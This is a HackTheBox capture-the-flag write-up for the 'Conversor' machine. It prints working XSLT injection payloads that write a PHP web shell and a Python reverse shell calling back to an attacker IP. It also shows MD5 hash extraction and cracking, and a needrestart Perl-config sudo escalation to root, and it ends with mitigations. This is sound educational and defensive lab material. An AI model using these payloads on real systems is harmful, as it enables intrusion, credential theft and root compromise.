---
title: "Conversor"
date: 2026-03-21 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [Command-Injection, EXSLT, File-Write, Hash-Cracking, MD5, Perl, SQLite, XSLT-Injection, needrestart, sudo]
description: Writeup for HackTheBox Conversor machine
image:
  path: assets/img/conversor/conversor.png
  alt: HTB Conversor
---
## Executive Summary
This report details the security assessment of the HackTheBox machine "Conversor" (medium-difficulty, Linux). The attack chain is as follows:

* **XSLT Injection → Web Shell** — The web app converts Nmap XML to HTML via XSLT. Upload a malicious XSLT using `exsl:document` to write a Python reverse shell to `scripts/connection.py`. Navigate to the script to trigger execution as `www-data`.
* **SQLite → Credential Extraction** — Read the app's SQLite database; extract MD5 hash for `fismathack`. Crack offline to recover password `Keepmesafeandwarm`. SSH in as `fismathack`.
* **needrestart Config Injection → Root** — Fismathack has `NOPASSWD` sudo for `/usr/sbin/needrestart`. Supply a malicious Perl config via `-c` flag — since `needrestart` is Perl-based, the config file executes arbitrary code as root.

---

## Reconnaissance

We initiate the target system assessment by running a comprehensive version and script detection scan using Nmap:

```shell
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ IP=10.129.97.240                                         
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ nmap -A $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 03:28 EDT
Nmap scan report for 10.129.97.240
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   235.88 ms 10.10.14.1
2   236.08 ms 10.129.97.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.87 seconds
```

The scan identifies two open ports:
* **Port 22**: SSH remote login
* **Port 80**: HTTP web application

We resolve the target hostname locally before continuing:

```shell
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ echo "10.129.97.240 conversor.htb" | sudo tee -a /etc/hosts
```

---

## Web Application Enumeration

We navigate to `http://conversor.htb/` and find a portal with user registration and login functionality.

<img src="assets/img/conversor/image1.png" alt="Error loading image"/>

We register a new user:

<img src="assets/img/conversor/image2.png" alt="Error loading image"/>

We log in to access the main user interface dashboard:

<img src="assets/img/conversor/image3.png" alt="Error loading image"/>

The "Conversor" application allows users to transform Nmap XML scan results into readable HTML structures using Extensible Stylesheet Language Transformations (XSLT).

---

## Exploitation: XSLT Injection to Reverse Shell

XSLT is a Turing-complete language used to transform XML documents. If the XSLT engine configuration is over-permissive and supports file operations (e.g., through EXSLT extension elements), we can exploit it to write arbitrary files to the host.

To verify the XML rendering behavior, we upload a simple test template:

**Test.xml**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<report>
  <title>Conversor test</title>
  <host>conversor.htb</host>
  <items>
    <item id="1">alpha</item>
    <item id="2">beta</item>
  </items>
</report>
```

**Test.xslt**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="html" encoding="UTF-8"/>
  <xsl:template match="/">
    <html><body><h1>POC: XSLT executed </h1></body></html>
  </xsl:template>
</xsl:stylesheet>
```

Upon uploading and initiating the conversion, a link to the transformed HTML output is returned:

<img src="assets/img/conversor/image4.png" alt="Error loading image"/>

Accessing the link confirms the transformation engine is active:

<img src="assets/img/conversor/image5.png" alt="Error loading image"/>

### Attempting PHP Web Shell Write
We craft a malicious XSLT template that utilizes the EXSLT `exsl:document` extension element to write a PHP web shell to the web root directory `/var/www/conversor.htb/scripts/shell.php`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl"
    version="1.0">

<xsl:template match="/">
  <exsl:document href="/var/www/conversor.htb/scripts/shell.php" method="text">
&lt;?php system($_GET["cmd"]); ?&gt;
  </exsl:document>
  
  <result>PHP shell written to scripts directory</result>
</xsl:template>
</xsl:stylesheet>
```

We upload the template and execute the conversion. Although the write operation succeeds, navigating to the file produces no output, suggesting execution restrictions on PHP files:

```text
http://conversor.htb/scripts/shell.php?cmd=id
http://conversor.htb/shell.php?cmd=id
```

<img src="assets/img/conversor/image6.png" alt="Error loading image"/>

### Writing a Python Reverse Shell Payload
Since PHP execution is restricted, we target Python execution. We write a Python reverse shell payload script to `/var/www/conversor.htb/scripts/connection.py`.

We set up a Netcat listener:

```shell
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ nc -lvnp 4444
```

We upload the XSLT template to write the Python script:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ext="http://exslt.org/common"
    extension-element-prefixes="ext"
    version="1.0">
    
<xsl:output method="xml" encoding="UTF-8"/>

<xsl:template match="/root">
  <ext:document href="/var/www/conversor.htb/scripts/connection.py" method="text">
#!/usr/bin/env python3
import socket, subprocess as sp, os
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("10.10.14.166", 4444))
for fd in range(3):
    os.dup2(conn.fileno(), fd)
sp.call(["/bin/bash", "-i"])
  </ext:document>
</xsl:template>
</xsl:stylesheet>
```

We upload the files and run the conversion. Navigating to the generated script triggers execution, establishing a reverse shell as `www-data`:

<img src="assets/img/conversor/image7.png" alt="Error loading image"/>

```shell
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ nc -lvnp 4444   
listening on [any] 4444 ...
connect to [10.10.14.166] from (UNKNOWN) [10.129.72.155] 34052
bash: cannot set terminal process group (8646): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Lateral Movement to User fismathack

We inspect the application structure and find a SQLite database file `users.db` in `/var/www/conversor.htb/instance/`:

```shell
www-data@conversor:~$ cd conversor.htb
www-data@conversor:~/conversor.htb$ ls
app.py  app.wsgi  instance  __pycache__  scripts  shell.php  static  templates  uploads
www-data@conversor:~/conversor.htb$ cd instance
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
.tables
files  users

select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|kali|d6ca3fd0c3a3b462ff2b83436dda495e
```

We extract the raw MD5 hash for the user `fismathack`: `5b5c3ac3a1c897c94caad48e6c71fdec`. We crack it offline using John the Ripper:

```shell
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
kali             (?)     
Keepmesafeandwarm (?)     
3g 0:00:00:01 DONE (2025-10-26 08:18) 1.764g/s 6454Kp/s 6454Kc/s 6537KC/s Keiser01..Keepers137
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

The cracked credentials are:
* **Username**: `fismathack`
* **Password**: `Keepmesafeandwarm`

We log in via SSH to read the user flag (`user.txt`):

```shell
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ ssh fismathack@conversor.htb
fismathack@conversor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
...
fismathack@conversor:~$ cat user.txt 
************d73a17d18919e78505cf
```

---

## Privilege Escalation

We run `sudo -l` to check the permitted sudo commands for `fismathack`:

```shell
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

We are allowed to run `/usr/sbin/needrestart` as root without a password.

### Auditing the needrestart Utility
`needrestart` is a utility that identifies daemons that need to be restarted after system library updates:

```shell
fismathack@conversor:~$ sudo /usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.
...
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -c <cfg>    config filename
...
```

The help options reveal that `needrestart` allows defining a custom configuration file using the `-c` flag. Since `needrestart` is written in Perl, the configuration files are parsed and executed as Perl scripts. By providing a custom Perl script to the configuration argument, we execute arbitrary commands under `needrestart`'s privileged execution context.

### Exploiting needrestart Configuration Execution

We write a simple Perl script calling a system shell to `/tmp/exploit.pl`:

```shell
fismathack@conversor:~$ cat > /tmp/exploit.pl << 'EOF'
system("/bin/bash");
EOF
```

We execute `needrestart` pointing to our exploit script using sudo:

```shell
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /tmp/exploit.pl
root@conversor:/home/fismathack# id
uid=0(root) gid=0(root) groups=0(root)
root@conversor:/home/fismathack# cd /root
root@conversor:~# cat root.txt
************42afea83140ed365407f
```

The script executes, spawning an interactive bash shell as root.

---

## Mitigations & Security Recommendations

To secure the host against similar compromise vectors, the following hardening steps are recommended:

1. **Disable Dangerous XSLT Configurations:**
   * Configure the XSLT transformer engine to block external resource access and disable extension elements (such as `exsl:document`).
   * If XSLT processing is required, run the transformation process inside a sandbox environment with read-only filesystem access.

2. **Implement Strong Password Hashing:**
   * Enforce password complexity policies. Replace MD5 hashing with slow, salted password hashing algorithms (e.g., bcrypt, PBKDF2, or Argon2) to secure database records against offline cracking.

3. **Restrict Sudo Permissions and Needrestart Options:**
   * Avoid granting NOPASSWD access to commands that support user-definable config paths (like `needrestart -c`).
   * Audit the `/etc/sudoers` configuration and restrict `needrestart` execution to standard system administrators only.
   * If `needrestart` must be allowed via sudo, implement shell wrappers that restrict the use of the `-c` and `--config` parameters.
